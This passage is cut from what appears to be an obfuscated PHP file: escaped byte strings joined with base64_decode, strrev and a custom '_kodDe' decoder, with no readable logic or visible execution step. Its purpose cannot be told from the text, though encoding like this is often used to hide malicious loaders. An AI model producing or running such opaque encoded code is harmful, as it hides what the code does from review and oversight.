K159NH3H9a/N/vDBZPV7Zz1/7O0PnjvjmL6+6sb7E3974pYFez66df1Tp0UmftRy0x9/og==')."\267\236\60\111\77\374\237\7\336\275\262\361\273\117\115\175\361\305\65\252\165\323\355\23\67\376\344\77\227\75\362\302\237\376\360\307\67\256\275\355\17\57\277\167\122\176\357\236\275\47\115\237"."\x7d\xf6\xeb\xb5\x27\xb7\xe8\xc6\xfa\xc9\xd7\x9d\x34\xd0\x94\x3c\xf1\x85\x99\x57\xc7\x56\xdc\xd3\xbc\xf2\x4f\xd7\x4c\xfc\xda\xa5\x37\xfc\x71\xf5\xfc\xb\xe6\x4f\x3c\xfa\xdd\x7f\x3d\x95\x2a\x4c\x5c\xf8\xbd\x15"."\xbe\x1d\x3b\xfe\xf0\xcc\xf9\x9b\x9e\x1f\x6c\x3e\x70\xd2\xa3\x7\x1e\x5f\xdc\xf4\x9d\x3f\x9f\xfe\xa5\x7b\xef\xdc\xb6\x72\xf4\xea\xdf\x9e\x3a\x72\xd2\xf6\x62\xf8\xcc\x81\xc7\x5e\x9a\x7a\xf0\x8b\x5f\x3c\x71\xdd"."\324\376\167\127\6\233\376\136\373\305\317\315\375\373\253\223\326\175\71\261\143\146\316\274\363\361\201\330\171\351\375\7\176\271\360\322\307\257\330\175\363\351\107\335\371\243\25\177\156\273\161\366"."\255\73\277\343\117\375\161\365\213\275\263\166\375\356\253\137\373\376\224\147\117\375\355\272\327\167\374\140\113\250\161\375\234\143\336\234\264\366\312\277\336\36\111\204\67\77\264\366\361\300\125\267"."\x7e\xf1\xbe\xb7\x3e\x59\x33\xd9\xf8\xcf\x45\x53\x2e\xbd\xe3\x9c\xdb\xa7\xbc\x53\x97\xda\x7d\x8f\x36\xf9\xb9\xb\xb7\x8d\x7c\xe8\x5f\x7c\xeb\xcb\x91\x3b\xa2\x85\xb1\xaa\x47\x6a\x1a\x9e\xb4\xb7\x3f\x76\xfc\x45".base64_decode('StsFJxaOuHbdVVf37ktUn3aUdtOPb9o848q249v677h8xsSvNu5acvbKz3se2PQt/WdPPQ==')."\246\134\76\177\346\125\51\357\363\371\257\176\360\140\157\350\117\305\335\227\277\260\57\366\346\233\275\117\65\334\366\376\3\357\375\341\375\367\207\372\206\26\277\232\337\170\363\216\305\57\375\311"."\177\173\165\146\325\57\127\335\336\161\335\235\277\317\344\157\231\70\367\265\203\133\327\75\265\167\376\202\57\257\376\367\313\157\170\362\215\111\311\65\17\377\342\57\277\337\265\344\7\273\275\337".strrev('ûR×t›¬Oû¶û—‡Ç¾ú÷fs[î¼Û|Lï‡øï«å3]*/š[¦”û5?§Ÿoíé~').base64_decode('Sc98y75l2gsTmqLrHw4OBV+s/vitZ//zpklv37zxS6G3v/Jw744HJ0986PqGyyfoHXet/w==')."\370\351\55\175\352\71\37\176\174\353\115\376\163\67\174\374\362\362\103\237\374\367\213\37\54\371\246\172\356\77\136\177\45\366\311\307\143\17\127\37\172\372\276\11\227\274\377\374\263\207\256\376".base64_decode('5IOG9z/6l//qfeecc+7bD35gflL4+K0Lr1Y/evUv78Q++eRPTw+tPOX5Dxt/+5R9et3YzQ==')."\x7f\x7a\x27\xd3\x3e\xc3\xcc\xfe\x69\xe8\xba\x7d\x7\x3e\xba\x7e\xff\x7\xd1\xbb\xe2\x7b\xde\xf8\xdb\xf3\xef\xfd\xfb\xd7\x2e\x7c\x72\xd9\x3d\xcf\xbe\xf1\xee\x65\xdb\x62\x7f\x7b\xf1\x5b\x47\x7c\xfe\xee\xcf\x3d"."\371\362\257\106\26\266\334\161\376\213\307\275\265\373\133\15\337\173\362\351\372\277\176\375\205\77\216\55\273\257\75\222\373\144\105\146\332\372\51\361\272\117\56\75\335\76\346\372\321\143\265\205".base64_decode('v418xXPtnleWttbvT2e/8Ze0b6Zi/+CS3AOrP/Q+VGje/fZJ7MVd/XwQhK3JD2TSjB8FCQ==').base64_decode('bn9qYETvAZ4K4GbMgMz6mfCcSBsp2UX2Uk7r7cmmM3D0Y0+Whgt91iAccubWzaWB+aAiNQ==')."\x9b\xdd\x34\xaf\xcd\xf\x14\xfa\xe0\x63\xf3\xe6\xce\xa7\x81\x59\xb3\xe1\x73\xb3\xe6\xc2\xdd\xe8\xdc\x39\x10\x98\x3f\x9b\xb7\x4\xaa\x58\x6b\x66\x86\x7b\xfa\x40\x64\x95\x2e\xc\xe5\x35\x6b\xd\x80\xcc\x9b\x1"."\325\324\1\254\335\237\32\326\212\160\352\230\67\17\32\65\23\300\326\144\214\154\217\65\2\55\234\17\215\251\237\1\201\71\263\231\32\352\100\66\77\144\3\233\15\145\353\147\101\145\203\172"."\126\113\261\123\132\237\61\222\351\67\207\331\367\240\346\71\60\252\363\146\300\130\315\231\3\303\222\357\53\15\365\26\327\62\170\50\60\167\76\273\41\56\246\13\43\354\365\25\113\54\366\224"."\262\153\373\106\230\114\243\130\112\247\230\140\262\57\237\53\256\1\321\144\117\61\225\267\106\140\76\146\262\46\314\234\3\315\66\206\327\152\172\21\152\261\13\203\146\211\135\253\144\265\65\205"."\314\20\214\357\160\157\306\352\51\202\154\250\176\56\14\310\34\26\230\133\17\115\66\106\326\152\275\72\134\133\316\232\77\223\235\170\212\171\243\17\116\75\103\10\40\325\7\143\323\123\350\117"."\xd9\x79\xf8\x7c\xdf\xd0\x40\xef\x1a\x13\xd0\x49\x1f\xec\xcf\x64\xd7\xe\xb0\x29\x80\xd9\x9f\x51\xf\xe3\x3e\x87\x4d\xd3\xbc\x99\xd0\x93\xb9\x73\x67\x32\xbe\x9f\x75\xb2\x7e\x36\xc3\xa2\x7a\x86\x7e\x30\x78\x66"."\157\252\244\217\200\302\305\334\131\120\62\147\257\35\66\172\230\2\217\226\51\254\131\313\156\71\346\262\71\231\131\317\2\120\325\54\310\231\305\20\163\26\153\110\252\210\216\201\371\54\33\53".base64_decode('mOv5DGEMqz+bYzg5Yw7DXailiLUrMsPsG/CxwnBe68lCu+fXQWpaz5eKZi9bob3W4BBc9w==')."\xeb\xa9\xb5\xfd\x23\xc\x65\x67\x33\x5c\xb5\xfb\x6\x47\xcc\x22\x5c\x44\xf4\xf\x6b\xe6\xe0\x10\x14\xce\x59\xc3\x7a\x1f\x13\x1b\xe6\x47\xac\x35\xc3\xfd\x26\x1b\x43\xb6\x84\xd9\xba\x28\xe6\x87\xed\x35\x5\x98"."\353\374\32\124\154\30\32\146\17\245\214\176\15\346\273\267\307\54\256\115\301\104\146\372\173\7\326\26\330\213\104\155\244\70\324\73\314\116\216\331\201\21\246\6\154\17\24\255\354\132\350\303"."\332\221\101\73\227\115\61\264\130\63\302\5\141\75\43\303\172\206\351\25\314\255\257\143\313\71\137\350\35\142\264\5\22\15\255\64\322\227\206\366\315\141\210\321\244\245\372\231\24\226\53\366"."\312\32\261\124\267\213\212\273\344\153\13\366\112\322\310\373\162\132\236\353\325\264\102\223\345\264\176\135\147\272\365\60\126\266\120\206\0\145\134\110\67\162\272\220\54\123\371\75\53\51\216\312".base64_decode('WE4hqVPgaEKuBREhKRvFHLkJWf0feodb6JN7vTLHNJkr3AOCNNWyBs0ijFi/mU5lzVLaUQ==')."\x6b\xba\xc7\x57\x61\x24\x69\x4f\x2a\xe5\xf4\xba\xd3\xb9\x4e\x90\xa8\xd0\xa1\xe6\xce\xd2\x1c\xa3\xd6\x43\x66\x94\x2b\x20\xe1\x3f\xd0\x6e\xfa\xde\xd7\xc2\xa\xdb\xfc\x79\x1a\x85\xf6\xb1\x89\xe9\x91\xd0\x81\xa"."\306\155\315\352\367\311\311\136\71\327\310\243\366\146\263\76\347\13\160\374\24\273\243\135\115\6\22\113\45\305\76\374\124\230\341\216\52\24\216\244\176\210\111\223\106\120\236\73\147\237\31\156"."\x1c\xde\x77\xcf\xe8\x65\x57\x8d\xed\xd8\x3f\xb6\x75\xef\xe8\xdd\x57\x1c\xde\xbb\x7f\xf4\xc0\xe\x14\x3d\x78\xe7\xb6\xd1\xbd\xd7\xbf\xf6\xdd\x4d\x7\xef\xdc\x7a\xf0\xce\x6f\x1f\xbe\xf0\xb6\x37\xef\xbd\x74\xf4"."\xb2\x7d\x87\xcf\x3f\x30\xba\x73\xf7\xe8\xf\x2f\x3c\x78\xcf\x81\xc3\xf7\x5f\x78\x68\xf7\x96\x83\x77\xee\x19\xdb\x79\xf1\xe8\xa6\x3b\xe\xde\x73\xd5\xe8\x45\xdf\x1f\xbd\xf0\xb2\xb1\x2b\xb6\x1e\x3c\xb0\x13\xc1"."\x8f\x5d\x24\x6a\x46\x60\xa3\x7b\xae\xc1\x65\xef\xdd\x38\x7a\xe7\x9d\x87\x6f\xdc\xcd\x73\xdf\xbc\xf7\x3c\xda\x98\x11\x58\x99\x4b\x74\x5b\x49\x9c\x1d\x61\xda\x5a\x4\x21\x95\x45\xa\xa0\xa2\x6e\xf9\x94\xf6\xac"."\x8e\x46\x4c\x21\xca\x4f\x58\xb5\xcb\xce\xe8\x45\xc5\x26\x2a\x5e\x1a\xfa\x9b\x37\xf3\x5e\x8a\x6a\xf4\xf5\xba\xa5\x18\x79\x9c\xad\xb0\xb1\xf6\x71\x74\x4c\xea\xb9\x2\x46\x2a\x18\x25\x3f\x7d\xc6\xea\x78\x2c\x21"."\x61\x5e\xa5\x61\xa6\x19\x15\xf0\x8\x8f\xb5\x98\xab\x1a\x1c\x84\xeb\x30\x2c\x74\x53\x7a\x35\x94\x90\x6e\x50\x7a\x51\x31\x85\x3d\xd6\x52\x6c\x93\x85\x73\xc3\x7c\xd2\x5d\xe8\x5f\x71\x5a\x79\x33\xd8\xd4\xf6\x71"."\xd9\xb7\x10\xc9\x42\xc3\xa4\x57\x30\xf4\xbe\xa3\xc\xa5\xc8\x7a\x72\x12\x3\xc7\x4a\x73\x92\x11\x39\xcb\x39\x12\x20\x33\x25\x57\xf7\x1e\x85\x36\xc5\xa3\x90\xb\x5b\xc5\xf9\x66\x1b\x5f\xc5\xb3\xeb\x6d\x79\xcd"."\310\315\57\352\205\54\277\271\301\142\307\212\203\350\352\102\242\302\160\361\116\70\62\321\172\54\331\25\0\345\121\225\145\261\206\31\314\42\122\46\156\22\311\245\271\150\56\215\12\31\60\372"."\20\247\204\105\75\155\60\235\143\75\107\40\201\2\372\244\33\30\372\260\211\53\76\247\20\332\27\35\227\113\13\27\27\62\5\154\0\303\136\260\30\64\360\331\13\67\251\15\20\26\17\265".base64_decode('5NSs+8KKL5LmJskMBQZr8Hq9kmBVaHbhEFQn7m1RWgiv4PHSm7k6A1rafX26ZTeQ967KdA==')."\x5\x35\x74\x9e\x6f\x6\xa\x90\x45\x30\xdb\x37\x17\x5\xc9\x88\xc1\xc2\xed\x82\x51\x2c\x59\xec\xf5\xd1\x14\xdf\x2c\xe0\x42\xac\x5\xa0\x8b\xb1\x80\xd0\x8f\x46\xa9\xf9\x90\x2e\x4a\x95\xf2\x59\x96\x8a\x82\x8"."\x24\x5e\xca\xe3\xd9\x6e\x70\xf6\x59\xcf\xa7\xa5\x42\xb\xb4\x94\x2d\xd5\xaa\xf6\xc2\xa0\xfa\xc4\x78\x68\xd3\x45\xbe\x9e\x3e\x1d\x26\x46\x1a\xa5\x41\x0\x60\x65\xdb\x9c\x38\x80\xfa\xef\xe5\x68\x81\xa6\x17\x71"."\202\151\213\250\255\302\256\1\125\132\222\171\200\270\300\50\134\234\14\327\247\24\265\345\51\57\244\314\174\236\53\204\132\131\215\135\374\131\370\35\115\136\347\370\127\262\370\335\4\326\355\126".base64_decode('0c5tCVxV0wZkRsJNanMYVAYD7WE1kYhJKq7kWfEKdWmsWQ3GYkvDgGMwqg0S6cOvGcV1Lg==')."\216\211\127\215\370\12\104\326\337\222\271\12\154\50\3\357\237\11\5\364\34\21\62\7\133\3\161\256\374\76\333\127\347\233\41\140\321\7\125\254\374\337\310\136\336\47\222\201\170\5\163\51"."\324\214\12\214\70\230\116\201\2\255\261\345\112\60\26\351\150\213\46\250\225\20\232\36\215\111\371\104\305\31\262\231\61\225\362\154\250\76\324\36\11\4\103\112\70\232\214\261\307\13\134\215"._kodDe('MSmANkgl3W8Iko9QYD0WM4uU0V8iqXqtEzu+YjxCRKHEh5vHm6vCmBscyDNaKXP9KlxW23M=')."\65\360\120\332\202\325\331\226\100\273\70\15\306\342\201\140\204\65\245\51\220\200\140\54\30\246\201\103\127\376\354\340\335\333\16\135\267\167\364\342\255\250\242\261\153\67\216\135\175\7\342\75".base64_decode('ML+x99JD920bu3Lf2KXnQfsP7/v5wQP3H7py9+jea8auuuvQtRfQjNd+8rPRS3bzhimvXQ==')."\x71\xdf\xd8\xb6\x1f\x71\x1e\x84\xb2\x1e\x1e\x54\xfa\xb5\x4d\x5b\xf\x1d\xd8\x8b\x39\x90\x5d\xdf\x1e\xbb\x7d\xcb\xd8\xce\xad\xa3\x97\xdc\x38\xfa\xdd\xdd\x87\xb6\xed\x1b\xfd\xc1\xf9\xa3\x9b\xb7\x1e\xde\xb7\xe3"."\164\67\42\321\170\47\233\12\170\120\355\77\7\77\206\247\303\333\145\115\307\103\133\213\176\153\360\223\10\364\313\124\247\211\72\355\331\35\241\150\60\344\176\133\44\107\301\322\314\64\212\41"."\x54\xb5\x4\x98\x4e\xb\x2c\xd5\xb0\x38\xb1\x4a\xd1\x58\x3d\x6e\x2b\xd6\xc3\xfc\x4b\x8d\x92\x1a\xd3\x1c\x4a\x4\xe3\xe1\xa6\x10\x28\xdd\xf3\x89\x9a\x42\x18\x26\x50\x2c\x40\xa9\x89\xf8\x32\x1e\xe6\x8f\x51\xcb"."\54\3\51\65\14\231\153\25\107\107\64\137\312\314\226\162\171\322\130\245\12\353\71\125\171\360\6\103\36\72\51\125\170\263\104\11\72\176\102\137\203\155\206\20\255\330\352\225\325\236\72\317".base64_decode('jFoFzAbREmAsSKkC5WpezvERT48jNsNTV6tUFfqroF1iXFHrVQppKZqnBhosN1fAIvJo2Q==').base64_decode('Rc3I25aS8vAkXh79OgwApXyiBJ0nBOFOUwLRZicktRvUXk2UElM+mxsfYdNcXav0wFOGCg==')."\x99\xa4\x98\x63\x30\x1a\x1d\x83\x51\x33\x1d\xe8\x44\xfb\x12\x3e\xdf\xf4\x21\x80\x42\xdf\xaf\xd1\x66\x69\x16\x9b\x28\x48\x25\x53\x85\x53\xe9\x6c\x31\x58\x13\x75\x3\x4d\xe\x85\x47\x1\x9e\x83\x55\xe6\x79\x4d"."\210\34\361\14\66\203\70\235\117\142\205\74\142\320\251\212\62\165\264\237\71\253\217\221\72\170\50\337\266\222\367\201\341\262\302\70\15\156\16\12\277\304\13\45\203\255\24\313\23\22\232\247"."\x7b\xa6\x38\x10\x55\xc\xa7\xe2\x40\x11\x7e\x32\x0\x38\xba\x5c\x30\x41\x38\x8e\xc0\x85\xa3\x2d\xb1\x78\x1b\x7d\x81\x96\x8\xb6\x86\xda\x2\x3e\x20\xe2\x14\x13\x28\x3c\x66\xa3\x94\x46\xa5\x1a\x53\x3e\x9a\x54"."\355\30\176\362\41\66\144\111\362\125\264\256\124\33\361\104\164\24\12\175\320\30\230\175\205\274\370\327\110\221\306\152\152\224\5\252\344\166\313\142\361\244\212\6\0\310\263\104\165\253\245\335"."\x42\xd2\xa0\xc6\xef\xa9\x6\x18\x4b\xdf\x8b\x98\x1c\x93\x99\x97\x49\xf7\x30\xa1\x2d\xaa\x1c\xd7\x19\x8c\x45\x5b\xc2\xec\xb1\x5d\x33\x1c\x80\xb\x69\xd3\x1\xd4\x1c\xf\x63\x9b\x1b\xf0\x7d\x85\x55\x25\x3d\x71"."\104\21\241\306\200\42\205\301\64\17\13\63\6\70\203\357\371\50\42\266\174\24\341\233\15\206\222\354\260\341\357\47\242\74\54\370\130\24\351\110\260\307\14\230\372\56\157\346\341\126\376\342"."\x1c\x67\xc4\xe2\x52\x24\x10\xf\xb4\x25\x78\x34\xbe\x9c\x3f\x8e\xe0\x69\xf4\x91\x84\x1a\xed\x68\x13\x14\x3f\x12\x58\x86\x90\x25\x26\x18\x14\x46\xad\x6b\x7c\xd3\x16\xd7\x76\xd1\x67\x71\x34\x48\x7f\xce\x64\x31"."\xfc\x16\xa7\x7b\xdd\xc\x8f\x32\x67\x43\x2d\xc0\x70\xdb\x15\x76\xc6\xc8\x33\x46\x12\x7f\xe5\xec\x88\x1a\x89\x2d\xa1\x71\x62\x1f\x2e\x94\x4f\x8b\x63\x87\xd2\xa9\x20\xae\x36\x29\xb8\x5a\x8b\x6d\x5d\x7c\x35\x28".base64_decode('CIcV+shWicaWB4TJMSkDUoQFMv85nV2DXT7ELFirxTO35iaFsSHEbAmc4qF0gG2jqz2wYw==')."\250\131\263\217\31\24\102\4\221\261\13\364\167\5\13\20\132\11\5\122\344\1\362\20\157\104\300\273\112\355\132\337\65\265\313\353\243\157\13\61\363\322\345\21\115\122\103\53\320\36\233\110"."\70\36\106\252\304\164\26\324\216\172\11\41\272\152\151\144\41\374\300\301\152\41\260\247\20\135\324\310\47\63\164\366\372\50\372\273\44\271\76\204\376\106\320\117\44\211\246\313\340\0\150\111".base64_decode('RsJLQ+vxPyKjlg8kfaPjLBCOrkf/IgKzPhx1V9YUSi4PhSgAC8OvAEUEB7oq2Q/ECvOQLQ==')."\24\350\241\152\125\255\41\203\351\355\236\136\253\252\176\253\3\360\205\33\347\250\251\236\74\243\32\366\220\100\42\50\250\257\3\41\312\161\201\250\267\73\21\201\133\305\203\370\222\170\254\243"._kodDe('MHhL9KVzhDmRukZ7LZRzwy9hOG8mFnR+tgY/gdmu0QBeNqRo1BYLesspFjZ4KRr6LLg+Sto=').strrev('²‹ (Ä"ÅÃ#'."\0".'°ÈEĞL,ä<g<œXãXS)ì:¨B†Âü³HáMe').base64_decode('Pp2EoiwPHQDR4Y2d6jLaAH/MuCDdI1nuwDTYRwVf2H4LOjFqXMjpklUSMZN0qqcqb4r0mA==')."\32\13\75\45\321\220\237\102\40\346\223\300\240\337\256\325\213\11\163\274\232\341\51\175\307\153\47\15\73\353\370\50\74\250\103\37\15\223\127\214\322\147\141\173\247\62\76\325\224\44\314\144".base64_decode('35YThFSJiqNBICuENljzj4hqadR5ouJkajU/KIEhBA/8QotOoD9dEGUCii74SLUHNt0uxg==')."\260\167\166\15\325\325\171\321\77\363\320\337\46\364\67\210\376\206\160\102\113\327\320\334\26\24\230\337\322\355\207\113\63\366\140\301\371\160\264\253\253\152\274\101\6\0\66\324\20\255\242\121".base64_decode('VsrgO2cqgw3KqHaOCb/JEU9Inan8W8Sb47F2ysco4RaFWldQqqnEvBoYtGA8hNcYhWJ5NQ==')."\xd5\xe\x89\xd5\xa2\x6a\x5\x5e\x5c\xd7\x3a\x4b\x85\xa3\xcd\xa1\x15\x4a\xb5\x91\x1e\x52\x35\x4d\x85\xc2\xa\x5a\xd1\xac\x22\xa5\xac\x26\x56\x3\x6d\x2b\xdc\xa2\x59\x19\x73\x50\x91\x91\x94\x9d\xba\x83\x34\x2d"."\51\20\267\214\301\43\166\22\330\363\121\17\34\355\171\16\345\253\151\126\70\201\266\375\110\204\364\24\145\31\26\146\207\75\12\67\147\200\23\361\21\206\112\77\241\42\226\101\53\242\131\241"."\25\311\170\0\47\22\36\166\342\161\350\17\41\113\370\214\125\314\151\364\115\45\341\374\174\253\101\324\260\332\301\150\122\26\24\263\232\200\167\144\343\224\372\304\163\210\274\201\16\263\54\215".base64_decode('WAq8O421x8NtgfhKGDJxkoCFa2YdL2tFxLA6pKfnUdRq+Sk6nWNOp9GpmNFp1BoarMIzTw==')."\203\140\11\126\345\117\167\231\50\246\206\75\201\365\260\0\63\355\100\236\25\61\141\126\16\21\56\36\23\263\6\270\17\263\42\347\312\17\243\204\251\132\274\325\342\111\146\173\106\113\240\43"."\x22\xa7\xc0\x50\x29\x4b\x43\x2b\x3f\x65\x8d\xb0\x96\x56\x5a\x23\x2c\x8f\x9\x75\xf8\x6a\x83\xfe\xd4\xcc\x86\xfe\x51\xa3\x13\x35\xf5\xe8\x64\x5b\xca\x63\xf3\x34\xdc\x1a\x26\xb4\xa\x76\xe8\x8e\x64\x4c\x45\xbb"."\120\74\204\367\4\350\21\37\126\251\275\322\351\135\236\24\250\6\3\160\273\277\237\322\65\6\123\251\153\274\74\227\137\205\242\113\302\321\120\143\333\160\70\21\150\123\130\303\101\102\207\155"."\140\316\203\172\302\61\65\202\70\153\125\26\302\205\143\40\7\166\30\130\124\125\141\261\304\247\11\45\152\273\130\222\314\325\31\46\121\130\156\343\157\33\210\206\65\102\210\200\60\130\300\145"."\325\44\257\324\203\113\313\233\36\224\167\331\61\65\314\6\234\203\201\51\257\263\100\200\253\216\217\273\65\224\345\144\241\74\55\56\163\331\175\61\67\167\7\5\72\244\27\375\270\260\302\76"."\x48\x2e\x75\xf2\xce\xe6\xa1\x6d\x36\xcb\x4c\x4e\xa9\xba\xe8\x4d\x4e\xb7\x2c\x7e\xa9\x9b\xcc\xe8\x8a\x55\xd0\x53\xc4\x70\xa6\x2\xe6\xde\x94\xb4\xa9\x5b\xc2\xd2\x36\x8c\x3d\x39\x6d\xb1\xa0\x9d\x11\xa6\x19\x64"."\213\263\315\115\154\220\113\171\73\241\147\101\106\337\334\103\264\324\305\173\62\361\176\107\322\136\47\127\55\142\346\250\35\75\127\101\250\51\314\207\106\202\22\211\21\141\142\26\337\154\210\72"."\xbb\x99\xcc\x40\x8c\xc7\x88\xc1\x36\x41\xf7\x5d\x20\x6f\x64\xde\x6c\xd7\x8b\x39\x83\x5c\xe7\x2c\x17\xb7\x35\xb0\xcf\xa0\xa\xe8\xfc\xfb\x14\x57\x39\x79\xd4\xf1\x15\x60\x19\x24\x36\x41\xf1\x69\x73\xc8\xac\x8d"."\221\226\111\217\11\161\24\160\5\337\147\112\117\64\112\171\364\21\257\374\350\7\341\16\111\224\236\31\60\243\203\64\66\227\51\364\150\154\1\61\105\41\366\133\144\71\76\141\262\206\324\211"."\xb9\x2a\xaf\xb0\xd1\x90\xd6\xe4\xf7\x95\x92\xad\xf6\xd3\x65\x4c\x21\x53\x2e\x70\xbb\xd7\x90\xd\x36\xf8\x84\x95\x5e\xbe\x5c\xce\xe4\x13\x85\xdf\x1d\xc3\xa5\x3a\x66\xd8\x7b\x55\xa9\x2d\xed\x1c\x5e\xd8\xe7\xa4".strrev('! \'ÑŸYAú^qˆM§f#‚6¯3jR;„°ÿãVˆÑ•À²A IM!£').base64_decode('bmIRFaSG6D67UIdkJnkcklKxXBAA+QeLROj02R+M62LXR8XIG6/PLCRILPkSKSSRZVcZgg==')."\216\364\75\12\314\174\6\262\5\216\241\275\40\32\123\133\321\166\23\143\114\211\141\45\35\344\235\225\2\22\142\43\236\51\345\47\57\146\341\340\270\200\50\15\320\153\114\230\354\165\210\162"."\363\20\123\371\0\153\135\202\31\10\320\237\225\271\264\27\65\34\260\56\255\333\334\130\22\246\202\354\245\41\156\263\364\336\70\307\11\354\240\144\27\125\33\320\361\223\56\46\226\51\323\226"."\201\256\224\167\16\232\210\257\317\22\261\216\70\273\343\301\161\54\333\122\343\241\340\112\176\335\302\123\133\2\313\334\51\141\54\233\14\54\251\230\314\45\146\70\235\34\115\325\170\14\213\26"."\103\221\26\127\201\104\53\267\251\353\114\123\43\341\350\322\212\31\210\65\151\223\212\320\304\160\62\324\346\116\163\326\220\10\5\342\314\340\63\216\67\105\142\101\51\73\34\53\37\11\316\373".strrev(';ƒO›bÙ\'g½%rQ¼o±—MmCk¸»^íW†	c×¥:QS‘Öºjsş‰¤˜*Dğ')."\1\357\133\54\221\26\203\230\337\347\203\217\360\200\277\313\317\54\162\371\105\46\374\12\370\63\134\173\14\30\130\117\120\363\106\216\206\272\314\154\260\7\355\76\367\273\53\225\75\266\142\224"."\x55\xeb\x65\xca\x2\x61\x7a\x8b\xab\x26\x56\x26\xf8\x5c\x39\xd3\x1c\x18\x49\x71\x5a\xd6\x99\x70\x1\xa3\xbf\xed\x32\x28\x56\xc7\xa9\x8\xe8\x40\x69\xc7\x3b\x62\x39\xc9\x67\x98\x62\xb5\x88\x65\x9d\x36\x53\x25".strrev('‚V+å²Çd‰ã³ö±¢ÚF–³á­%Ö¸ˆ8Í„¯hóz¶	•XÒïA*|’Œux‘ÌH±l')."\15\310\6\206\64\275\212\227\311\102\300\24\255\177\100\53\372\7\230\161\375\145\370\320\241\133\176\231\231\343\211\250\217\330\120\60\263\161\106\105\30\74\27\123\17\177\345\54\132\233\77\227"."\267\147\214\3\321\136\324\173\114\323\36\47\167\131\333\247\127\14\231\235\135\126\67\307\322\264\76\0\101\241\317\146\211\243\26\60\31\136\331\310\77\306\126\231\137\114\367\270\270\1\110\20"."\x16\xad\x24\x9e\x41\x24\x72\x53\xd1\x34\x3a\xac\xb\x2d\x40\x73\x50\x32\xb5\xcc\x16\xcd\x5a\x62\xd5\xd3\x6d\x12\x74\xad\x57\xeb\x77\xe4\xb\x3\xcb\x6b\xbd\xe8\xf8\xe9\x88\xbb\xcc\x82\x4e\x25\x34\xbe\xcd\xec"."\x2b\xd6\xfb\x6d\xdc\x92\x3c\xda\x17\xe0\x6b\xc0\x29\xc8\xcb\x80\xec\x15\x5c\xad\x7\xef\x48\xad\xae\x45\xc8\x13\xb9\x1\x8a\x4\x51\x6f\x6c\x50\x66\x81\x59\xfc\x16\xc4\x53\xa7\x95\x4e\xca\x26\x83\x48\x1f\xb3"."\130\304\262\73\215\172\24\141\200\232\11\143\235\226\245\331\72\40\306\145\4\357\235\222\315\17\60\252\232\353\27\172\142\271\176\256\353\221\162\160\25\170\3\157\221\324\311\4\343\0\376\53"."\120\136\323\60\123\205\205\367\230\115\303\161\311\63\217\303\364\203\354\361\103\53\24\202\31\334\7\307\342\164\44\245\344\110\57\326\120\221\65\133\234\346\255\121\166\63\345\336\322\34\336\22"."\41\156\242\264\127\62\136\132\126\3\342\364\362\41\366\364\274\54\27\261\205\206\310\376\364\266\264\221\341\345\300\160\62\0\254\147\173\202\305\126\333\324\41\257\151\131\336\102\321\304\12\154"."\215\106\256\317\157\15\102\136\126\263\354\145\16\223\74\237\151\335\32\133\236\150\343\174\62\64\141\310\113\260\232\175\104\142\146\374\105\142\351\316\63\10\373\202\207\230\264\124\353\30\302\370"."\x51\xdb\xfc\xd8\xe2\x21\x61\x68\xb9\xde\x59\x2c\xc1\xee\x7f\x9c\xbd\xa7\x5e\x9b\xa4\x23\x36\x58\x35\xe3\x16\x9d\xb9\xbd\x67\x61\x14\x9a\x8a\xed\x69\x58\x58\xab\x45\x7c\x79\xa0\xf\x1b\xe2\x30\xf3\xcc\x2f\xd"."\xf5\x16\x20\x5b\x1d\x4f\xeb\xa4\xb9\xfc\xe9\xb9\x64\xb0\x1b\x7b\xac\x40\x4b\x9d\xa9\xe6\x49\xa6\xbb\x11\xa7\xd7\xc7\xa7\x91\x18\xe8\x95\xd\x21\xe2\x21\xf7\xe6\x1c\x8e\x2a\xe8\x4\x39\xd\x62\x5b\xba\xde\xcf".strrev('aõKGPìÑÄ¦[Şµ*«?¥í'."\0".'uü?€`rIë¤RW‚b·®méËväRŠlñ	T')."\x66\x9d\xdb\x45\xe6\x5c\x6\xbd\xbb\x96\x74\xb5\x75\x25\xe5\xee\xda\x45\xad\xb7\x17\x35\x56\x32\x71\xea\x68\x8b\xb0\x1f\xe\xd8\x44\x9c\x8e\xb0\x21\x18\xdf\xfa\x38\x5c\x55\x4c\xad\x68\xbc\x1c\x32\xe3\xb4\xef"."\101\174\254\32\302\36\41\204\215\315\216\170\304\161\377\4\240\254\227\43\31\157\220\51\170\231\245\154\232\34\125\321\247\314\54\72\245\213\233\350\261\253\277\77\166\353\216\303\367\137\77\266".base64_decode('7UcH77xnbOfdNJ2OWrOe53M/tuU7h+753uG997929d4377308L6fY02jG35EFY9GL9s4tg==')."\143\377\350\145\227\34\276\375\202\261\273\267\217\175\357\374\327\276\273\375\325\157\157\204\325\223\47\306\76\3\305\276\222\30\47\132\144\354\373\367\216\336\173\331\153\127\176\367\360\276\175\22"."\xbc\x8d\xf5\xe0\xb2\xd2\xf2\x41\x33\x39\xba\x79\xd3\x6b\xe7\xef\x1e\xbd\xec\xf2\x43\x57\xde\x50\x56\x80\x7e\xc0\x3d\xd7\xb8\x7b\x3b\x2e\x3a\x74\xed\x5\x52\x8e\xbb\x50\x13\x31\x2c\x2e\xce\xe7\xbc\xc\xcd\x18"."\335\276\365\320\177\354\167\27\242\26\362\53\24\32\273\352\302\203\367\334\341\52\24\65\23\245\124\246\111\262\140\76\166\351\205\243\173\257\345\37\71\170\347\126\252\113\356\52\302\65\337\70".strrev('ºv{cÇıº7Ù®&a‹Ğï?ßCæßtng“Ğö¡÷=¡ò'."\n".'vi¶—´-ÔÙº°Á>